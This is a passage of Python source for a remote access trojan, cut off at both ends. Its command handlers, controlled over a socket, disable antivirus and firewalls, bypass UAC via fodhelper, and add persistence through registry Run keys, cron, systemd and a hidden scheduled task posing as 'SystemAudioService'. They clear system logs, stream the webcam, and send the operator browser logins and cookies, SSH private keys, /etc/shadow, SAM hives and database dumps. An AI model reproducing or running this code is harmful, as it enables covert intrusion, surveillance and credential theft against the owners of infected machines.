                                    ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection', '/v', 'DisableRealtimeMonitoring', '/t', 'REG_DWORD', '/d', '1', '/f'],
                                    ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features', '/v', 'TamperProtection', '/t', 'REG_DWORD', '/d', '0', '/f'],
                                    ['sc', 'config', 'WinDefend', 'start=', 'disabled'],
                                    ['sc', 'stop', 'WinDefend']
                                ]
                                
                                success_count = 0
                                for method in methods:
                                    try:
                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
                                        if result.returncode == 0:
                                            success_count += 1
                                    except:
                                        pass
                                
                                if success_count > 0:
                                    s.send(f"[+] Windows Defender disabled ({success_count}/{len(methods)} methods successful)\n\n".encode())
                                else:
                                    s.send("[!] Failed to disable Windows Defender\n\n".encode())
                            else:
                                # Linux - disable common AV
                                av_services = ['clamav-freshclam', 'clamav-daemon', 'chkrootkit', 'rkhunter']
                                disabled = 0
                                for service in av_services:
                                    try:
                                        subprocess.run(['systemctl', 'stop', service], capture_output=True, timeout=5)
                                        subprocess.run(['systemctl', 'disable', service], capture_output=True, timeout=5)
                                        disabled += 1
                                    except:
                                        pass
                                s.send(f"[+] Disabled {disabled} Linux AV services\n\n".encode())
                        except:
                            s.send("[!] Error disabling AV\n\n".encode())
                        continue
                    
                    if command.lower() == 'hide_firewall':
                        try:
                            if IS_WINDOWS:
                                # Modern Windows Firewall disable
                                methods = [
                                    ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
                                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile', '/v', 'EnableFirewall', '/t', 'REG_DWORD', '/d', '0', '/f'],
                                    ['sc', 'config', 'MpsSvc', 'start=', 'disabled'],
                                    ['sc', 'stop', 'MpsSvc']
                                ]
                                
                                success_count = 0
                                for method in methods:
                                    try:
                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
                                        if result.returncode == 0:
                                            success_count += 1
                                    except:
                                        pass
                                
                                if success_count > 0:
                                    s.send(f"[+] Windows Firewall disabled ({success_count}/{len(methods)} methods successful)\n\n".encode())
                                else:
                                    s.send("[!] Failed to disable Windows Firewall\n\n".encode())
                            else:
                                # Linux - disable iptables/ufw
                                firewalls = ['ufw', 'iptables', 'firewalld']
                                disabled = 0
                                for fw in firewalls:
                                    try:
                                        if fw == 'ufw':
                                            subprocess.run(['ufw', 'disable'], capture_output=True, timeout=5)
                                            disabled += 1
                                        elif fw == 'iptables':
                                            subprocess.run(['iptables', '-F'], capture_output=True, timeout=5)
                                            subprocess.run(['iptables', '-X'], capture_output=True, timeout=5)
                                            disabled += 1
                                        elif fw == 'firewalld':
                                            subprocess.run(['systemctl', 'stop', 'firewalld'], capture_output=True, timeout=5)
                                            subprocess.run(['systemctl', 'disable', 'firewalld'], capture_output=True, timeout=5)
                                            disabled += 1
                                    except:
                                        pass
                                s.send(f"[+] Disabled {disabled} Linux firewalls\n\n".encode())
                        except:
                            s.send("[!] Error disabling firewall\n\n".encode())
                        continue
                    
                    if command.lower() == 'elevate_uac':
                        try:
                            if IS_WINDOWS:
                                # Modern UAC bypass using fodhelper
                                import tempfile
                                
                                # Create registry entry for fodhelper UAC bypass
                                reg_path = r'SOFTWARE\\Classes\\ms-settings\\shell\\open\\command'
                                
                                # Get current executable path
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                commands = [
                                    ['reg', 'add', f'HKCU\\{reg_path}', '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
                                    ['reg', 'add', f'HKCU\\{reg_path}', '/v', '(Default)', '/t', 'REG_SZ', '/d', current_exe, '/f'],
                                    ['fodhelper.exe']
                                ]
                                
                                for cmd in commands[:-1]:  # Don't run fodhelper yet
                                    try:
                                        subprocess.run(cmd, capture_output=True, timeout=5)
                                    except:
                                        pass
                                
                                s.send("[+] UAC bypass registry entries created\n[!] Run 'fodhelper.exe' manually to trigger elevation\n\n".encode())
                            else:
                                # Linux - check for sudo and attempt to preserve
                                if os.path.exists('/etc/sudoers'):
                                    try:
                                        result = subprocess.run(['sudo', '-n', 'true'], capture_output=True, timeout=5)
                                        if result.returncode == 0:
                                            s.send("[+] Already have sudo access\n\n".encode())
                                        else:
                                            s.send("[!] No sudo access - try 'sudo su'\n\n".encode())
                                    except:
                                        s.send("[!] Cannot check sudo access\n\n".encode())
                                else:
                                    s.send("[!] No sudo system found\n\n".encode())
                        except:
                            s.send("[!] UAC elevation failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'add_startup':
                        try:
                            if IS_WINDOWS:
                                import winreg
                                
                                # Get current executable path
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                # Add to Run registry
                                key = winreg.HKEY_CURRENT_USER
                                subkey = winreg.OpenKey(key, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                                winreg.SetValueEx(subkey, 'SystemAudioService', 0, winreg.REG_SZ, current_exe)
                                winreg.CloseKey(subkey)
                                
                                # Also add to RunOnce
                                subkey2 = winreg.OpenKey(key, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce', 0, winreg.KEY_WRITE)
                                winreg.SetValueEx(subkey2, 'SystemAudioService', 0, winreg.REG_SZ, current_exe)
                                winreg.CloseKey(subkey2)
                                
                                s.send(f"[+] Added to startup registry: {current_exe}\n\n".encode())
                            else:
                                # Linux - add to crontab
                                import tempfile
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                # Create cron entry
                                cron_entry = f'@reboot {current_exe} --background\n'
                                
                                try:
                                    # Add to crontab
                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
                                    existing_cron = result.stdout
                                except:
                                    existing_cron = ''
                                
                                new_cron = existing_cron + cron_entry
                                
                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                                    f.write(new_cron)
                                    temp_cron = f.name
                                
                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
                                os.remove(temp_cron)
                                
                                s.send(f"[+] Added to crontab: {current_exe}\n\n".encode())
                        except:
                            s.send("[!] Failed to add to startup\n\n".encode())
                        continue
                    
                    if command.lower() == 'hide_file':
                        try:
                            import tempfile
                            
                            # Hide current executable
                            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                            
                            if IS_WINDOWS:
                                # Windows - set hidden and system attributes
                                subprocess.run(['attrib', '+h', '+s', current_exe], capture_output=True, timeout=5)
                                s.send(f"[+] File hidden: {current_exe}\n\n".encode())
                            else:
                                # Linux - rename with dot prefix
                                hidden_name = '.' + os.path.basename(current_exe)
                                hidden_path = os.path.join(os.path.dirname(current_exe), hidden_name)
                                
                                if os.path.exists(current_exe) and not os.path.exists(hidden_path):
                                    os.rename(current_exe, hidden_path)
                                    s.send(f"[+] File hidden: {hidden_path}\n\n".encode())
                                else:
                                    s.send("[!] File already hidden or doesn't exist\n\n".encode())
                        except:
                            s.send("[!] Failed to hide file\n\n".encode())
                        continue
                    
                    if command.lower() == 'check_admin':
                        try:
                            if IS_WINDOWS:
                                import ctypes
                                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                                s.send(f"[+] Admin status: {'YES' if is_admin else 'NO'}\n\n".encode())
                            else:
                                # Linux - check if root
                                is_root = os.geteuid() == 0
                                s.send(f"[+] Root status: {'YES' if is_root else 'NO'}\n\n".encode())
                        except:
                            s.send("[!] Could not check admin status\n\n".encode())
                        continue
                    
                    if command.lower() == 'clear_logs':
                        try:
                            if IS_WINDOWS:
                                # Clear Windows event logs
                                logs = ['Application', 'System', 'Security']
                                cleared = 0
                                
                                for log in logs:
                                    try:
                                        subprocess.run(['wevtutil', 'cl', log], capture_output=True, timeout=10)
                                        cleared += 1
                                    except:
                                        pass
                                
                                # Also clear PowerShell logs
                                try:
                                    subprocess.run(['powershell', '-Command', 'Clear-EventLog -LogName Windows PowerShell'], capture_output=True, timeout=10)
                                    cleared += 1
                                except:
                                    pass
                                
                                s.send(f"[+] Cleared {cleared} Windows event logs\n\n".encode())
                            else:
                                # Linux - clear system logs
                                log_files = [
                                    '/var/log/syslog',
                                    '/var/log/auth.log',
                                    '/var/log/kern.log',
                                    '/var/log/messages',
                                    '/var/log/secure',
                                    '~/.bash_history'
                                ]
                                
                                cleared = 0
                                for log_file in log_files:
                                    try:
                                        log_path = os.path.expanduser(log_file)
                                        if os.path.exists(log_path):
                                            with open(log_path, 'w') as f:
                                                f.write('')
                                            cleared += 1
                                    except:
                                        pass
                                
                                s.send(f"[+] Cleared {cleared} Linux log files\n\n".encode())
                        except:
                            s.send("[!] Failed to clear logs\n\n".encode())
                        continue
                    
                    # --- Enhanced Surveillance Commands ---
                    global webcam_active, webcam_thread
                    if command.lower() == 'webcam_start':
                        try:
                            import cv2
                            import tempfile
                            import threading
                            
                            if not webcam_active:
                                webcam_active = True
                                
                                def webcam_stream():
                                    global webcam_active
                                    cap = cv2.VideoCapture(0)
                                    
                                    while webcam_active:
                                        ret, frame = cap.read()
                                        if ret:
                                            path = os.path.join(tempfile.gettempdir(), f"webcam_live_{int(time.time())}.jpg")
                                            cv2.imwrite(path, frame)
                                            
                                            with open(path, 'rb') as f:
                                                img_data = f.read()
                                            
                                            import base64
                                            encoded = base64.b64encode(img_data).decode()
                                            
                                            # Send to server
                                            try:
                                                s.send(f"WEBCAM_FRAME:{encoded[:100]}...\n".encode())
                                            except:
                                                break
                                            
                                            try:
                                                os.remove(path)
                                            except:
                                                pass
                                        
                                        time.sleep(2)  # Frame every 2 seconds
                                    
                                    cap.release()
                                
                                webcam_thread = threading.Thread(target=webcam_stream, daemon=True)
                                webcam_thread.start()
                                s.send("[+] Webcam streaming started\n\n".encode())
                            else:
                                s.send("[!] Webcam already streaming\n\n".encode())
                        except ImportError:
                            s.send("[!] OpenCV not available for webcam\n\n".encode())
                        except:
                            s.send("[!] Webcam stream failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'webcam_stop':
                        webcam_active = False
                        s.send("[+] Webcam streaming stopped\n\n".encode())
                        continue
                    
                    if command.lower() == 'browser_dump':
                        try:
                            import sqlite3
                            import base64
                            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                            from cryptography.hazmat.backends import default_backend
                            
                            dump_output = "Browser Data Dump:\n\n"
                            
                            # Chrome
                            if IS_WINDOWS:
                                chrome_paths = [
                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/History'),
                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Login Data'),
                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Cookies')
                                ]
                            else:
                                chrome_paths = [
                                    os.path.expanduser('~/.config/google-chrome/Default/History'),
                                    os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
                                    os.path.expanduser('~/.config/google-chrome/Default/Cookies')
                                ]
                            
                            for path in chrome_paths:
                                if os.path.exists(path):
                                    try:
                                        temp_db = os.path.join(tempfile.gettempdir(), f'chrome_{int(time.time())}.db')
                                        shutil.copy2(path, temp_db)
                                        
                                        conn = sqlite3.connect(temp_db)
                                        cursor = conn.cursor()
                                        
                                        if 'History' in path:
                                            cursor.execute('SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 10')
                                            history = cursor.fetchall()
                                            dump_output += "Chrome History (Top 10):\n"
                                            for url, title, count in history:
                                                dump_output += f"  {title}: {url} ({count} visits)\n"
                                        
                                        elif 'Login Data' in path:
                                            cursor.execute('SELECT origin_url, username_value FROM logins')
                                            logins = cursor.fetchall()
                                            dump_output += "\nChrome Logins:\n"
                                            for url, user in logins[:5]:
                                                dump_output += f"  {user} @ {url}\n"
                                        
                                        elif 'Cookies' in path:
                                            cursor.execute('SELECT name, host_key FROM cookies LIMIT 10')
                                            cookies = cursor.fetchall()
                                            dump_output += "\nChrome Cookies:\n"
                                            for name, host in cookies:
                                                dump_output += f"  {name} @ {host}\n"
                                        
                                        conn.close()
                                        os.remove(temp_db)
                                        
                                    except:
                                        pass
                                
                            # Firefox
                            if IS_WINDOWS:
                                firefox_base = os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles')
                            else:
                                firefox_base = os.path.expanduser('~/.mozilla/firefox')
                            
                            if os.path.exists(firefox_base):
                                for profile in os.listdir(firefox_base):
                                    if profile.endswith('.default'):
                                        profile_path = os.path.join(firefox_base, profile)
                                        
                                        firefox_files = [
                                            os.path.join(profile_path, 'places.sqlite'),
                                            os.path.join(profile_path, 'formhistory.sqlite')
                                        ]
                                        
                                        for ff_path in firefox_files:
                                            if os.path.exists(ff_path):
                                                try:
                                                    temp_db = os.path.join(tempfile.gettempdir(), f'firefox_{int(time.time())}.db')
                                                    shutil.copy2(ff_path, temp_db)
                                                    
                                                    conn = sqlite3.connect(temp_db)
                                                    cursor = conn.cursor()
                                                    
                                                    if 'places' in ff_path:
                                                        cursor.execute('SELECT url, title FROM moz_places ORDER BY visit_count DESC LIMIT 10')
                                                        history = cursor.fetchall()
                                                        dump_output += "\nFirefox History (Top 10):\n"
                                                        for url, title in history:
                                                            dump_output += f"  {title}: {url}\n"
                                                    
                                                    elif 'formhistory' in ff_path:
                                                        cursor.execute('SELECT fieldname, value FROM moz_formhistory LIMIT 10')
                                                        forms = cursor.fetchall()
                                                        dump_output += "\nFirefox Form History:\n"
                                                        for field, value in forms:
                                                            dump_output += f"  {field}: {value}\n"
                                                    
                                                    conn.close()
                                                    os.remove(temp_db)
                                                    
                                                except:
                                                    pass
                            
                            s.send(f"{dump_output}\n".encode())
                        except:
                            s.send("[!] Browser dump failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'postgres_dump':
                        try:
                            # Try to connect to PostgreSQL
                            result = subprocess.run(['psql', '--version'], capture_output=True, text=True, timeout=5)
                            if result.returncode == 0:
                                dump_output = "PostgreSQL Database Dump:\n"
                                
                                # Try common databases
                                databases = ['postgres', 'template1', 'information_schema']
                                
                                for db in databases:
                                    try:
                                        result = subprocess.run(['pg_dump', db], capture_output=True, text=True, timeout=10)
                                        if result.returncode == 0:
                                            dump_output += f"\n--- Database: {db} ---\n{result.stdout[:500]}...\n"
                                    except:
                                        pass
                                
                                s.send(f"{dump_output}\n".encode())
                            else:
                                s.send("[!] PostgreSQL not found\n\n".encode())
                        except:
                            s.send("[!] PostgreSQL dump failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'firefox_pass':
                        try:
                            import json
                            
                            dump_output = "Firefox Passwords:\n"
                            
                            if IS_WINDOWS:
                                firefox_base = os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles')
                            else:
                                firefox_base = os.path.expanduser('~/.mozilla/firefox')
                            
                            if os.path.exists(firefox_base):
                                for profile in os.listdir(firefox_base):
                                    if 'default' in profile:
                                        profile_path = os.path.join(firefox_base, profile)
                                        
                                        # Check for logins.json
                                        logins_file = os.path.join(profile_path, 'logins.json')
                                        if os.path.exists(logins_file):
                                            try:
                                                with open(logins_file, 'r') as f:
                                                    logins_data = json.load(f)
                                                
                                                if 'logins' in logins_data:
                                                    dump_output += f"\nProfile: {profile}\n"
                                                    for login in logins_data['logins'][:5]:
                                                        dump_output += f"  URL: {login.get('hostname', 'N/A')}\n"
                                                        dump_output += f"  User: {login.get('username', 'N/A')}\n"
                                                        dump_output += f"  Pass: (encrypted)\n\n"
                                                
                                            except:
                                                pass
                            
                            if dump_output == "Firefox Passwords:\n":
                                dump_output += "[!] No Firefox passwords found\n"
                            
                            s.send(f"{dump_output}\n".encode())
                        except:
                            s.send("[!] Firefox password extraction failed\n\n".encode())
                        continue
                    
                    # --- Linux-Specific Commands ---
                    if not IS_WINDOWS:
                        if command.lower() == 'add_cron':
                            try:
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                # Create persistent cron job
                                cron_entry = f'*/5 * * * * {current_exe} --background > /dev/null 2>&1\n'
                                
                                try:
                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
                                    existing_cron = result.stdout
                                except:
                                    existing_cron = ''
                                
                                new_cron = existing_cron + cron_entry
                                
                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                                    f.write(new_cron)
                                    temp_cron = f.name
                                
                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
                                os.remove(temp_cron)
                                
                                s.send(f"[+] Added persistent cron job: {current_exe}\n\n".encode())
                            except:
                                s.send("[!] Failed to add cron job\n\n".encode())
                            continue
                        
                        if command.lower() == 'add_service':
                            try:
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                # Create systemd service
                                service_content = f"""[Unit]
Description=SystemAudioService
After=network.target

[Service]
Type=simple
ExecStart={current_exe} --background
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                                
                                service_path = '/etc/systemd/system/system-audio-service.service'
                                
                                try:
                                    with open(service_path, 'w') as f:
                                        f.write(service_content)
                                    
                                    subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=5)
                                    subprocess.run(['systemctl', 'enable', 'system-audio-service.service'], capture_output=True, timeout=5)
                                    subprocess.run(['systemctl', 'start', 'system-audio-service.service'], capture_output=True, timeout=5)
                                    
                                    s.send(f"[+] Created and started systemd service: {service_path}\n\n".encode())
                                except:
                                    s.send("[!] Need root access to create service\n\n".encode())
                            except:
                                s.send("[!] Failed to create service\n\n".encode())
                            continue
                        
                        if command.lower() == 'check_root':
                            is_root = os.geteuid() == 0
                            if is_root:
                                s.send("[+] Running as ROOT\n\n".encode())
                            else:
                                s.send("[!] Not running as root\n\n".encode())
                            continue
                        
                        if command.lower() == 'shadow_dump':
                            try:
                                if os.path.exists('/etc/shadow'):
                                    if os.geteuid() == 0:
                                        with open('/etc/shadow', 'r') as f:
                                            shadow_content = f.read()
                                        s.send(f"/etc/shadow content:\n{shadow_content}\n".encode())
                                    else:
                                        s.send("[!] Need root access to read /etc/shadow\n\n".encode())
                                else:
                                    s.send("[!] /etc/shadow not found\n\n".encode())
                            except:
                                s.send("[!] Failed to read /etc/shadow\n\n".encode())
                            continue
                        
                        if command.lower() == 'ssh_keys':
                            try:
                                ssh_keys = "SSH Private Keys:\n"
                                
                                key_paths = [
                                    '~/.ssh/id_rsa',
                                    '~/.ssh/id_ecdsa',
                                    '~/.ssh/id_ed25519',
                                    '~/.ssh/id_dsa'
                                ]
                                
                                found_keys = 0
                                for key_path in key_paths:
                                    full_path = os.path.expanduser(key_path)
                                    if os.path.exists(full_path):
                                        try:
                                            with open(full_path, 'r') as f:
                                                key_content = f.read()
                                            ssh_keys += f"\n--- {key_path} ---\n{key_content[:200]}...\n"
                                            found_keys += 1
                                        except:
                                            pass
                                
                                if found_keys > 0:
                                    s.send(f"{ssh_keys}\n".encode())
                                else:
                                    s.send("[!] No SSH keys found\n\n".encode())
                            except:
                                s.send("[!] Failed to dump SSH keys\n\n".encode())
                            continue
                    
                    # --- File Encryption/Decryption ---
                    if command.lower() == 'decrypt_dir':
                        try:
                            from cryptography.fernet import Fernet
                            import base64
                            
                            # Ask for key
                            s.send("[!] Provide decryption key (base64): \n".encode())
                            
                            # Wait for key response (simplified)
                            key_data = s.recv(1024).decode().strip()
                            
                            try:
                                key = base64.b64decode(key_data)
                                fernet = Fernet(key)
                                
                                current_dir = os.getcwd()
                                decrypted_files = []
                                
                                for file in os.listdir(current_dir):
                                    if file.endswith('.encrypted'):
                                        try:
                                            with open(file, 'rb') as f:
                                                encrypted_data = f.read()
                                            
                                            decrypted_data = fernet.decrypt(encrypted_data)
                                            
                                            original_name = file[:-10]  # Remove .encrypted
                                            with open(original_name, 'wb') as f:
                                                f.write(decrypted_data)
                                            
                                            os.remove(file)
                                            decrypted_files.append(original_name)
                                        except:
                                            pass
                                
                                s.send(f"[+] Decrypted {len(decrypted_files)} files\n\n".encode())
                            except:
                                s.send("[!] Invalid decryption key\n\n".encode())
                        except ImportError:
                            s.send("[!] Cryptography library not available\n\n".encode())
                        except:
                            s.send("[!] Decryption failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'file_encrypt':
                        try:
                            from cryptography.fernet import Fernet
                            import base64
                            
                            parts = command.split(' ', 1)
                            if len(parts) < 2:
                                s.send("[!] Usage: file_encrypt <filename>\n\n".encode())
                                continue
                            
                            filename = parts[1]
                            if os.path.exists(filename):
                                key = Fernet.generate_key()
                                fernet = Fernet(key)
                                
                                with open(filename, 'rb') as f:
                                    data = f.read()
                                
                                encrypted_data = fernet.encrypt(data)
                                
                                with open(filename + '.encrypted', 'wb') as f:
                                    f.write(encrypted_data)
                                
                                os.remove(filename)
                                
                                s.send(f"[+] Encrypted {filename}\nKey: {base64.b64encode(key).decode()}\n\n".encode())
                            else:
                                s.send(f"[!] File not found: {filename}\n\n".encode())
                        except ImportError:
                            s.send("[!] Cryptography library not available\n\n".encode())
                        except:
                            s.send("[!] File encryption failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'file_decrypt':
                        try:
                            from cryptography.fernet import Fernet
                            import base64
                            
                            parts = command.split(' ', 2)
                            if len(parts) < 3:
                                s.send("[!] Usage: file_decrypt <filename> <key>\n\n".encode())
                                continue
                            
                            filename = parts[1]
                            key_b64 = parts[2]
                            
                            if os.path.exists(filename):
                                try:
                                    key = base64.b64decode(key_b64)
                                    fernet = Fernet(key)
                                    
                                    with open(filename, 'rb') as f:
                                        encrypted_data = f.read()
                                    
                                    decrypted_data = fernet.decrypt(encrypted_data)
                                    
                                    original_name = filename[:-10] if filename.endswith('.encrypted') else filename + '.decrypted'
                                    with open(original_name, 'wb') as f:
                                        f.write(decrypted_data)
                                    
                                    os.remove(filename)
                                    
                                    s.send(f"[+] Decrypted {filename} -> {original_name}\n\n".encode())
                                except:
                                    s.send("[!] Invalid key or decryption failed\n\n".encode())
                            else:
                                s.send(f"[!] File not found: {filename}\n\n".encode())
                        except ImportError:
                            s.send("[!] Cryptography library not available\n\n".encode())
                        except:
                            s.send("[!] File decryption failed\n\n".encode())
                        continue
                    
                    # --- Additional Stealth Commands ---
                    if command.lower() == 'add_task':
                        try:
                            if IS_WINDOWS:
                                import winreg
                                import tempfile
                                
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                
                                # Create scheduled task using schtasks
                                task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Audio Service</Description>
    <Author>System</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{current_exe}"</Command>
      <Arguments>--background</Arguments>
    </Exec>
  </Actions>
</Task>'''
                                
                                with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False, encoding='utf-16') as f:
                                    f.write(task_xml)
                                    xml_file = f.name
                                
                                # Create the task
                                result = subprocess.run(['schtasks', '/create', '/tn', 'SystemAudioService', '/xml', xml_file], capture_output=True, text=True, timeout=10)
                                
                                os.remove(xml_file)
                                
                                if result.returncode == 0:
                                    s.send(f"[+] Created scheduled task: SystemAudioService\n\n".encode())
                                else:
                                    s.send(f"[!] Failed to create task: {result.stderr}\n\n".encode())
                            else:
                                # Linux - add to cron with @reboot
                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                                cron_entry = f'@reboot {current_exe} --background > /dev/null 2>&1\n'
                                
                                try:
                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
                                    existing_cron = result.stdout
                                except:
                                    existing_cron = ''
                                
                                new_cron = existing_cron + cron_entry
                                
                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                                    f.write(new_cron)
                                    temp_cron = f.name
                                
                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
                                os.remove(temp_cron)
                                
                                s.send(f"[+] Added @reboot cron job\n\n".encode())
                        except:
                            s.send("[!] Failed to create scheduled task\n\n".encode())
                        continue
                    
                    if command.lower() == 'disable_av':
                        try:
                            disabled_count = 0
                            
                            if IS_WINDOWS:
                                # Disable multiple AV solutions
                                av_processes = [
                                    'MsMpEng.exe', 'MsMpEng.exe', 'SecurityHealthService.exe',
                                    'ekrn.exe', 'egui.exe', 'amon.exe', 'avp.exe',
                                    'bdagent.exe', 'mbam.exe', 'adaware.exe', 'spybot.exe'
                                ]
                                
                                for proc in av_processes:
                                    try:
                                        subprocess.run(['taskkill', '/F', '/IM', proc], capture_output=True, timeout=5)
                                        disabled_count += 1
                                    except:
                                        pass
                                
                                # Disable AV services
                                av_services = [
                                    'WinDefend', 'WdNisSvc', 'WdFilter', 'wscsvc',
                                    'ESET Service', 'ekrn', 'amav', 'avast! Antivirus'
                                ]
                                
                                for service in av_services:
                                    try:
                                        subprocess.run(['sc', 'stop', service], capture_output=True, timeout=5)
                                        subprocess.run(['sc', 'config', service, 'start=', 'disabled'], capture_output=True, timeout=5)
                                        disabled_count += 1
                                    except:
                                        pass
                                
                                s.send(f"[+] Disabled {disabled_count} AV processes/services\n\n".encode())
                            else:
                                # Linux - disable various AV/security tools
                                av_services = [
                                    'clamav-freshclam', 'clamav-daemon', 'clamav-scanner',
                                    'chkrootkit', 'rkhunter', 'lynis', 'maltrail'
                                ]
                                
                                for service in av_services:
                                    try:
                                        subprocess.run(['systemctl', 'stop', service], capture_output=True, timeout=5)
                                        subprocess.run(['systemctl', 'disable', service], capture_output=True, timeout=5)
                                        disabled_count += 1
                                    except:
                                        pass
                                
                                # Kill AV processes
                                av_processes = ['clamscan', 'freshclam', 'rkhunter', 'chkrootkit']
                                for proc in av_processes:
                                    try:
                                        subprocess.run(['pkill', '-f', proc], capture_output=True, timeout=5)
                                        disabled_count += 1
                                    except:
                                        pass
                                
                                s.send(f"[+] Disabled {disabled_count} Linux AV services\n\n".encode())
                        except:
                            s.send("[!] Failed to disable AV\n\n".encode())
                        continue
                    
                    if command.lower() == 'hide_process':
                        try:
                            if IS_WINDOWS:
                                # Hide process using multiple techniques
                                current_pid = os.getpid()
                                
                                # Method 1: Set process to hidden window
                                import ctypes
                                from ctypes import wintypes
                                
                                user32 = ctypes.windll.user32
                                kernel32 = ctypes.windll.kernel32
                                
                                # Get current process handle
                                h_process = kernel32.GetCurrentProcess()
                                
                                # Hide from task manager (modify process attributes)
                                try:
                                    # This is a simplified version - real process hiding requires kernel-level hooks
                                    user32.ShowWindow(user32.GetForegroundWindow(), 0)  # Hide window
                                    s.send(f"[+] Process {current_pid} window hidden\n\n".encode())
                                except:
                                    s.send("[!] Process hiding limited without kernel access\n\n".encode())
                            else:
                                # Linux - hide process using various techniques
                                current_pid = os.getpid()
                                
                                # Rename process in process list
                                try:
                                    import ctypes
                                    libc = ctypes.CDLL('libc.so.6')
                                    # This is limited - real hiding requires kernel modules
                                    s.send(f"[+] Process {current_pid} hiding attempted\n\n".encode())
                                except:
                                    s.send("[!] Process hiding requires root/kernel access\n\n".encode())
                        except:
                            s.send("[!] Failed to hide process\n\n".encode())
                        continue
                    
                    if command.lower() == 'sam_dump':
                        try:
                            if IS_WINDOWS:
                                import tempfile
                                
                                # Try to copy SAM file (requires admin)
                                sam_paths = [
                                    r'C:\Windows\System32\config\SAM',
                                    r'C:\Windows\System32\config\SYSTEM',
                                    r'C:\Windows\System32\config\SECURITY'
                                ]
                                
                                dump_output = "Windows Registry Files:\n"
                                
                                for sam_path in sam_paths:
                                    if os.path.exists(sam_path):
                                        try:
                                            # Try to copy file (requires elevated privileges)
                                            temp_file = os.path.join(tempfile.gettempdir(), f'sam_{int(time.time())}.bak')
                                            shutil.copy2(sam_path, temp_file)
                                            
                                            # Read first 1KB of file
                                            with open(temp_file, 'rb') as f:
                                                data = f.read(1024)
                                            
                                            import base64
                                            encoded = base64.b64encode(data).decode()
                                            
                                            dump_output += f"\n--- {os.path.basename(sam_path)} ---\n{encoded[:200]}...\n"
                                            
                                            os.remove(temp_file)
                                        except:
                                            dump_output += f"\n--- {os.path.basename(sam_path)} ---\n[!] Access denied (need admin)\n"
                                    else:
